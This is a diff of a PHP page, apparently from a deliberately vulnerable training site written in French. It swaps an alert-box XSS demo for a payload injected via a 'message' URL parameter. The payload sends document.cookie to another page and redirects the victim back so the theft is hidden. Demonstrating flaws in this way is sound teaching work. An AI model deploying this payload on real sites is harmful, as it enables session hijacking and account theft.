@@ -42,9 +42,9 @@
         ?>
 <div class="body-center"><b>Description:</b><br/>
             Cette page contient une faille XSS.
-            Vous pouvez ajouter une news avec la faille suivante dans le texte : <font color="red">&lt;script&gt;alert('Oh tiens, une faille xss');&lt;/script&gt;</font>
+            Vous pouvez ajouter une news avec la faille suivante dans le texte : <font color="red">membres.php?message=&ltscript&gtwindow.location.replace("test1.php?c="+document.cookie.toString());&lt/script&gt</font>
             <br/>
-            Une fenêtre d'alerte s'affiche alors sur la page<br/><br/><br/>
+            une page sur un autre serveur s'ouvre ou l'on récupère le cookie du site puis on redirige vers le client est redirigé vers le site pour ne pas voire la page malveillante<br/><br/><br/>
             
             
       
